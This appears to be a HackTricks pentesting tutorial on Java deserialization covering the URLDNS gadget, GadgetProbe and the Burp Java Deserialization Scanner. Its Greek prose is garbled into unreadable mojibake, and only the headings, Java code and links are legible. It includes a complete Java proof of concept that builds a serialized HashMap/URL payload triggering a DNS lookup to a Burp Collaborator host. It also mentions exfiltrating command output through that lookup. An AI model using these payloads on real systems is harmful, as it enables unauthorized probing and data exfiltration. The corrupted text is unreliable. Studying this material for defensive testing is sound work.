# Java DNS Deserialization, GadgetProbe and Java Deserialization Scanner

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## DNS request on deserialization

Î— ÎºÎ»Î¬ÏƒÎ· `java.net.URL` Ï…Î»Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î¿ `Serializable`, Î±Ï…Ï„ÏŒ ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Î±Ï…Ï„Î® Î· ÎºÎ»Î¬ÏƒÎ· Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯.
```java
public final class URL implements java.io.Serializable {
```
Î‘Ï…Ï„Î® Î· ÎºÎ»Î¬ÏƒÎ· Î­Ï‡ÎµÎ¹ Î¼Î¹Î± **Ï€ÎµÏÎ¯ÎµÏÎ³Î· ÏƒÏ…Î¼Ï€ÎµÏÎ¹Ï†Î¿ÏÎ¬.** Î‘Ï€ÏŒ Ï„Î·Î½ Ï„ÎµÎºÎ¼Î·ÏÎ¯Ï‰ÏƒÎ·: â€œ**Î”ÏÎ¿ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î­Ï‚ Î¸ÎµÏ‰ÏÎ¿ÏÎ½Ï„Î±Î¹ Î¹ÏƒÎ¿Î´ÏÎ½Î±Î¼Î¿Î¹ Î±Î½ ÎºÎ±Î¹ Ï„Î± Î´ÏÎ¿ Î¿Î½ÏŒÎ¼Î±Ï„Î± Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„ÏÎ½ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎµÏ€Î¹Î»Ï…Î¸Î¿ÏÎ½ ÏƒÏ„Î¹Ï‚ Î¯Î´Î¹ÎµÏ‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ IP**â€.\
ÎˆÏ„ÏƒÎ¹, ÎºÎ¬Î¸Îµ Ï†Î¿ÏÎ¬ Ï€Î¿Ï… Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ URL ÎºÎ±Î»ÎµÎ¯ **Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ** Î±Ï€ÏŒ Ï„Î¹Ï‚ **ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ `equals`** Î® **`hashCode`** Î¼Î¹Î± **Î±Î¯Ï„Î·ÏƒÎ· DNS** Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· IP Î¸Î± **ÏƒÏ„Î±Î»ÎµÎ¯**.

**Î— ÎºÎ»Î®ÏƒÎ·** Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ **`hashCode`** **Î±Ï€ÏŒ** Î­Î½Î± **Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ URL** ÎµÎ¯Î½Î±Î¹ Î±ÏÎºÎµÏ„Î¬ ÎµÏÎºÎ¿Î»Î·, Î±ÏÎºÎµÎ¯ Î½Î± ÎµÎ¹ÏƒÎ¬Î³ÎµÏ„Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± `HashMap` Ï€Î¿Ï… Ï€ÏÏŒÎºÎµÎ¹Ï„Î±Î¹ Î½Î± Î±Ï€Î¿ÏƒÏ…Î¼Ï€Î¹ÎµÏƒÏ„ÎµÎ¯. Î‘Ï…Ï„ÏŒ ÏƒÏ…Î¼Î²Î±Î¯Î½ÎµÎ¹ ÎµÏ€ÎµÎ¹Î´Î® **ÏƒÏ„Î¿ Ï„Î­Î»Î¿Ï‚** Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ **`readObject`** Î±Ï€ÏŒ Ï„Î¿ `HashMap` ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î±Ï…Ï„ÏŒÏ‚ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚:
```java
private void readObject(java.io.ObjectInputStream s)
throws IOException, ClassNotFoundException {
[   ...   ]
for (int i = 0; i < mappings; i++) {
[   ...   ]
putVal(hash(key), key, value, false, false);
}
```
Î•Î¯Î½Î±Î¹ **Î½Î±** **ÎµÎºÏ„ÎµÎ»ÎµÎ¯** Ï„Î¿ `putVal` Î¼Îµ ÎºÎ¬Î¸Îµ Ï„Î¹Î¼Î® Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ `HashMap`. Î‘Î»Î»Î¬, Ï€Î¹Î¿ ÏƒÏ‡ÎµÏ„Î¹ÎºÏŒ ÎµÎ¯Î½Î±Î¹ Ï„Î¿ ÎºÎ¬Î»ÎµÏƒÎ¼Î± Ï€ÏÎ¿Ï‚ Ï„Î¿ `hash` Î¼Îµ ÎºÎ¬Î¸Îµ Ï„Î¹Î¼Î®. Î‘Ï…Ï„ÏŒÏ‚ ÎµÎ¯Î½Î±Î¹ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ `hash`:
```java
static final int hash(Object key) {
int h;
return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```
ÎŒÏ€Ï‰Ï‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€Î±ÏÎ±Ï„Î·ÏÎ®ÏƒÎµÏ„Îµ, **ÏŒÏ„Î±Î½ Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¿Ï€Î¿Î¹ÎµÎ¯Ï„Îµ** Î­Î½Î± **`HashMap`** Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· `hash` Î¸Î± **ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î¼Îµ ÎºÎ¬Î¸Îµ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿** ÎºÎ±Î¹ **ÎºÎ±Ï„Î¬ Ï„Î· Î´Î¹Î¬ÏÎºÎµÎ¹Î±** Ï„Î·Ï‚ **ÎµÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚ `hash`** **Î¸Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹** Ï„Î¿ `.hashCode()` Ï„Î¿Ï… Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Î¿Ï…. Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î±Î½ **Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ** Î­Î½Î± **`HashMap`** **Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹** Î­Î½Î± **Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ URL**, Ï„Î¿ **Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ URL** Î¸Î± **ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹** Ï„Î¿ `.hashCode()`.

Î¤ÏÏÎ±, Î±Ï‚ ÏÎ¯Î¾Î¿Ï…Î¼Îµ Î¼Î¹Î± Î¼Î±Ï„Î¹Î¬ ÏƒÏ„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Ï„Î¿Ï… `URLObject.hashCode()`:
```java
public synchronized int hashCode() {
if (hashCode != -1)
return hashCode;

hashCode = handler.hashCode(this);
return hashCode;
```
ÎŒÏ€Ï‰Ï‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ, ÏŒÏ„Î±Î½ Î­Î½Î± `URLObject` ÎµÎºÏ„ÎµÎ»ÎµÎ¯ `.hashCode()`, ÎºÎ±Î»ÎµÎ¯Ï„Î±Î¹ `hashCode(this)`. ÎœÎ¹Î± ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚:
```java
protected int hashCode(URL u) {
int h = 0;

// Generate the protocol part.
String protocol = u.getProtocol();
if (protocol != null)
h += protocol.hashCode();

// Generate the host part.
InetAddress addr = getHostAddress(u);
[   ...   ]
```
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î¼Î¹Î± `getHostAddress` ÏƒÏ„Î¿ domain, **ÎµÎºÎºÎ¹Î½ÏÎ½Ï„Î±Ï‚ Î­Î½Î± DNS query**.

Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î±Ï…Ï„Î® Î· ÎºÎ»Î¬ÏƒÎ· Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯** Ï€ÏÎ¿ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Î½Î± **ÎµÎºÎºÎ¹Î½Î®ÏƒÎµÎ¹** Î­Î½Î± **DNS query** Î³Î¹Î± Î½Î± **Î´ÎµÎ¯Î¾ÎµÎ¹** ÏŒÏ„Î¹ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„Î® Î· **deserialization**, Î® Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Î³Î¹Î± Î½Î± **ÎµÎ¾Î¬Î³ÎµÎ¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚** (Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÏ„Îµ Ï‰Ï‚ Ï…Ï€Î¿Ï„Î¿Î¼Î­Î± Ï„Î·Î½ Î­Î¾Î¿Î´Î¿ Î¼Î¹Î±Ï‚ ÎµÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚ ÎµÎ½Ï„Î¿Î»Î®Ï‚).

### URLDNS payload code example

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î¿Î½ [ÎºÏÎ´Î¹ÎºÎ± payload URDNS Î±Ï€ÏŒ Ï„Î¿ ysoserial ÎµÎ´Ï](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java). Î©ÏƒÏ„ÏŒÏƒÎ¿, Î±Ï€Î»Î¬ Î³Î¹Î± Î½Î± Î´Î¹ÎµÏ…ÎºÎ¿Î»ÏÎ½Ï‰ Ï„Î·Î½ ÎºÎ±Ï„Î±Î½ÏŒÎ·ÏƒÎ· Ï„Î¿Ï… Ï€ÏÏ‚ Î½Î± Ï„Î¿ ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ, Î´Î·Î¼Î¹Î¿ÏÏÎ³Î·ÏƒÎ± Ï„Î¿ Î´Î¹ÎºÏŒ Î¼Î¿Ï… PoC (Î²Î±ÏƒÎ¹ÏƒÎ¼Î­Î½Î¿ ÏƒÎµ Î±Ï…Ï„ÏŒ Î±Ï€ÏŒ Ï„Î¿ ysoserial):
```java
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

public class URLDNS {
public static void GeneratePayload(Object instance, String file)
throws Exception {
//Serialize the constructed payload and write it to the file
File f = new File(file);
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
out.writeObject(instance);
out.flush();
out.close();
}
public static void payloadTest(String file) throws Exception {
//Read the written payload and deserialize it
ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
Object obj = in.readObject();
System.out.println(obj);
in.close();
}

public static void main(final String[] args) throws Exception {
String url = "http://3tx71wjbze3ihjqej2tjw7284zapye.burpcollaborator.net";
HashMap ht = new HashMap(); // HashMap that will contain the URL
URLStreamHandler handler = new SilentURLStreamHandler();
URL u = new URL(null, url, handler); // URL to use as the Key
ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

// During the put above, the URL's hashCode is calculated and cached.
// This resets that so the next time hashCode is called a DNS lookup will be triggered.
final Field field = u.getClass().getDeclaredField("hashCode");
field.setAccessible(true);
field.set(u, -1);

//Test the payloads
GeneratePayload(ht, "C:\\Users\\Public\\payload.serial");
}
}


class SilentURLStreamHandler extends URLStreamHandler {

protected URLConnection openConnection(URL u) throws IOException {
return null;
}

protected synchronized InetAddress getHostAddress(URL u) {
return null;
}
}
```
### Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚

* [https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
* Î£Ï„Î·Î½ Î±ÏÏ‡Î¹ÎºÎ® Î¹Î´Î­Î±, Ï„Î¿ payload Ï„Ï‰Î½ commons collections Î¬Î»Î»Î±Î¾Îµ Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î­Î½Î± DNS query, Î±Ï…Ï„ÏŒ Î®Ï„Î±Î½ Î»Î¹Î³ÏŒÏ„ÎµÏÎ¿ Î±Î¾Î¹ÏŒÏ€Î¹ÏƒÏ„Î¿ Î±Ï€ÏŒ Ï„Î· Ï€ÏÎ¿Ï„ÎµÎ¹Î½ÏŒÎ¼ÎµÎ½Î· Î¼Î­Î¸Î¿Î´Î¿, Î±Î»Î»Î¬ Î±Ï…Ï„Î® ÎµÎ¯Î½Î±Î¹ Î· Î±Î½Î¬ÏÏ„Î·ÏƒÎ·: [https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)

## GadgetProbe

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ [**GadgetProbe**](https://github.com/BishopFox/GadgetProbe) Î±Ï€ÏŒ Ï„Î¿ Burp Suite App Store (Extender).

**GadgetProbe** Î¸Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÎ¹ Î½Î± ÎºÎ±Ï„Î±Î»Î¬Î²ÎµÎ¹ Î±Î½ ÎºÎ¬Ï€Î¿Î¹ÎµÏ‚ **Java ÎºÎ»Î¬ÏƒÎµÎ¹Ï‚ Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½** ÏƒÏ„Î·Î½ Java ÎºÎ»Î¬ÏƒÎ· Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® ÏÏƒÏ„Îµ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ **Î±Î½** ÎµÎ¯Î½Î±Î¹ **ÎµÏ…Î¬Î»Ï‰Ï„Î·** ÏƒÎµ ÎºÎ¬Ï€Î¿Î¹Î± Î³Î½Ï‰ÏƒÏ„Î® ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·.

### Î ÏÏ‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯

**GadgetProbe** Î¸Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¿ Î¯Î´Î¹Î¿ **DNS payload Ï„Î·Ï‚ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î·Ï‚ ÎµÎ½ÏŒÏ„Î·Ï„Î±Ï‚** Î±Î»Î»Î¬ **Ï€ÏÎ¹Î½** ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Ï„Î¿ DNS query Î¸Î± **Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÎ¹ Î½Î± Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹ÎºÎ¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Î¼Î¹Î± Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î· ÎºÎ»Î¬ÏƒÎ·**. Î‘Î½ Î· **Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î· ÎºÎ»Î¬ÏƒÎ· Ï…Ï€Î¬ÏÏ‡ÎµÎ¹**, Ï„Î¿ **DNS query** Î¸Î± **ÏƒÏ„Î±Î»ÎµÎ¯** ÎºÎ±Î¹ Ï„Î¿ GadgetProbe Î¸Î± ÏƒÎ·Î¼ÎµÎ¹ÏÏƒÎµÎ¹ ÏŒÏ„Î¹ Î±Ï…Ï„Î® Î· ÎºÎ»Î¬ÏƒÎ· Ï…Ï€Î¬ÏÏ‡ÎµÎ¹. Î‘Î½ Ï„Î¿ **DNS** Î±Î¯Ï„Î·Î¼Î± **Ï€Î¿Ï„Î­ Î´ÎµÎ½ ÏƒÏ„Î±Î»ÎµÎ¯**, Î±Ï…Ï„ÏŒ ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Î· **Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î· ÎºÎ»Î¬ÏƒÎ· Î´ÎµÎ½ Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹ÎºÎ¿Ï€Î¿Î¹Î®Î¸Î·ÎºÎµ** ÎµÏ€Î¹Ï„Ï…Ï‡ÏÏ‚, Î¿Ï€ÏŒÏ„Îµ ÎµÎ¯Ï„Îµ Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Ï€Î±ÏÎ¿ÏÏƒÎ± ÎµÎ¯Ï„Îµ **Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î®ÏƒÎ¹Î¼Î·/ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÏƒÎ¹Î¼Î·**.

ÎœÎ­ÏƒÎ± ÏƒÏ„Î¿ github, [**GadgetProbe Î­Ï‡ÎµÎ¹ ÎºÎ¬Ï€Î¿Î¹ÎµÏ‚ Î»Î¯ÏƒÏ„ÎµÏ‚ Î»Î­Î¾ÎµÏ‰Î½**](https://github.com/BishopFox/GadgetProbe/tree/master/wordlists) Î¼Îµ Java ÎºÎ»Î¬ÏƒÎµÎ¹Ï‚ Î³Î¹Î± Î´Î¿ÎºÎ¹Î¼Î®.

![https://github.com/BishopFox/GadgetProbe/blob/master/assets/intruder4.gif](<../../.gitbook/assets/intruder4 (1) (1).gif>)

### Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Î Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚

* [https://know.bishopfox.com/research/gadgetprobe](https://know.bishopfox.com/research/gadgetprobe)

## Java Deserialization Scanner

Î‘Ï…Ï„ÏŒÏ‚ Î¿ ÏƒÎ±ÏÏ‰Ï„Î®Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **ÎºÎ±Ï„Î­Î²ÎµÎ¹** Î±Ï€ÏŒ Ï„Î¿ Burp App Store (**Extender**).\
Î— **ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ·** Î­Ï‡ÎµÎ¹ **Ï€Î±Î¸Î·Ï„Î¹ÎºÎ­Ï‚** ÎºÎ±Î¹ ÎµÎ½ÎµÏÎ³Î­Ï‚ **Î¹ÎºÎ±Î½ÏŒÏ„Î·Ï„ÎµÏ‚**.

### Î Î±Î¸Î·Ï„Î¹ÎºÎ®

Î‘Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®, **ÎµÎ»Î­Î³Ï‡ÎµÎ¹ Ï€Î±Î¸Î·Ï„Î¹ÎºÎ¬** ÏŒÎ»Î± Ï„Î± Î±Î¹Ï„Î®Î¼Î±Ï„Î± ÎºÎ±Î¹ Ï„Î¹Ï‚ Î±Ï€Î±Î½Ï„Î®ÏƒÎµÎ¹Ï‚ Ï€Î¿Ï… Î±Ï€Î¿ÏƒÏ„Î­Î»Î»Î¿Î½Ï„Î±Î¹ **Î±Î½Î±Î¶Î·Ï„ÏÎ½Ï„Î±Ï‚** **Java ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î± Î¼Î±Î³Î¹ÎºÎ¬ bytes** ÎºÎ±Î¹ Î¸Î± Ï€Î±ÏÎ¿Ï…ÏƒÎ¹Î¬ÏƒÎµÎ¹ Î¼Î¹Î± Ï€ÏÎ¿ÎµÎ¹Î´Î¿Ï€Î¿Î¯Î·ÏƒÎ· ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±Ï‚ Î±Î½ Î²ÏÎµÎ¸ÎµÎ¯ ÎºÎ¬Ï€Î¿Î¹Î±:

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](<../../.gitbook/assets/image (765).png>)

### Î•Î½ÎµÏÎ³Î®

**Î§ÎµÎ¹ÏÎ¿ÎºÎ¯Î½Î·Ï„Î· Î”Î¿ÎºÎ¹Î¼Î®**

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÏ€Î¹Î»Î­Î¾ÎµÏ„Îµ Î­Î½Î± Î±Î¯Ï„Î·Î¼Î±, Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ Î´ÎµÎ¾Î¯ ÎºÎ»Î¹Îº ÎºÎ±Î¹ `Send request to DS - Manual Testing`.\
Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î¼Î­ÏƒÎ± ÏƒÏ„Î·Î½ ÎºÎ±ÏÏ„Î­Î»Î± _Deserialization Scanner Tab_ --> _Manual testing tab_ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÏ€Î¹Î»Î­Î¾ÎµÏ„Îµ Ï„Î¿ **ÏƒÎ·Î¼ÎµÎ¯Î¿ ÎµÎ¹ÏƒÎ±Î³Ï‰Î³Î®Ï‚**. ÎšÎ±Î¹ **Î½Î± Î¾ÎµÎºÎ¹Î½Î®ÏƒÎµÏ„Îµ Ï„Î· Î´Î¿ÎºÎ¹Î¼Î®** (Î•Ï€Î¹Î»Î­Î¾Ï„Îµ Ï„Î·Î½ ÎºÎ±Ï„Î¬Î»Î»Î·Î»Î· ÎµÏ€Î¯Î¸ÎµÏƒÎ· Î±Î½Î¬Î»Î¿Î³Î± Î¼Îµ Ï„Î·Î½ ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹).

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](../../.gitbook/assets/3-1.png)

Î‘ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Î±Î½ Î±Ï…Ï„ÏŒ Î¿Î½Î¿Î¼Î¬Î¶ÎµÏ„Î±Î¹ "Î§ÎµÎ¹ÏÎ¿ÎºÎ¯Î½Î·Ï„Î· Î´Î¿ÎºÎ¹Î¼Î®", ÎµÎ¯Î½Î±Î¹ Î±ÏÎºÎµÏ„Î¬ **Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿**. Î˜Î± ÎµÎ»Î­Î³Î¾ÎµÎ¹ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î± Î±Î½ Î· **Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ·** ÎµÎ¯Î½Î±Î¹ **ÎµÏ…Î¬Î»Ï‰Ï„Î·** ÏƒÎµ **Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ ysoserial payload** ÎµÎ»Î­Î³Ï‡Î¿Î½Ï„Î±Ï‚ Ï„Î¹Ï‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Ï€Î±ÏÎ¿ÏÏƒÎµÏ‚ ÏƒÏ„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® Î¹ÏƒÏ„Î¿Ï ÎºÎ±Î¹ Î¸Î± ÎµÏ€Î¹ÏƒÎ·Î¼Î¬Î½ÎµÎ¹ Î±Ï…Ï„Î­Ï‚ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ ÎµÏ…Î¬Î»Ï‰Ï„ÎµÏ‚. Î“Î¹Î± Î½Î± **ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ** Î³Î¹Î± **ÎµÏ…Î¬Î»Ï‰Ï„ÎµÏ‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÏ€Î¹Î»Î­Î¾ÎµÏ„Îµ Î½Î± ÎµÎºÎºÎ¹Î½Î®ÏƒÎµÏ„Îµ **Javas Sleeps**, **sleeps** Î¼Î­ÏƒÏ‰ **ÎºÎ±Ï„Î±Î½Î¬Î»Ï‰ÏƒÎ·Ï‚ CPU**, Î® Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ **DNS** ÏŒÏ€Ï‰Ï‚ Î­Ï‡ÎµÎ¹ Î±Î½Î±Ï†ÎµÏÎ¸ÎµÎ¯ Ï€ÏÎ¿Î·Î³Î¿Ï…Î¼Î­Î½Ï‰Ï‚.

**Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·**

Î‘Ï†Î¿Ï Î­Ï‡ÎµÏ„Îµ ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÎµÎ¹ Î¼Î¹Î± ÎµÏ…Î¬Î»Ï‰Ï„Î· Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ· Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÏ„Îµ Ï„Î¿ Î±Î¯Ï„Î·Î¼Î± ÏƒÏ„Î·Î½ ÎºÎ±ÏÏ„Î­Î»Î± _Exploiting Tab_.\
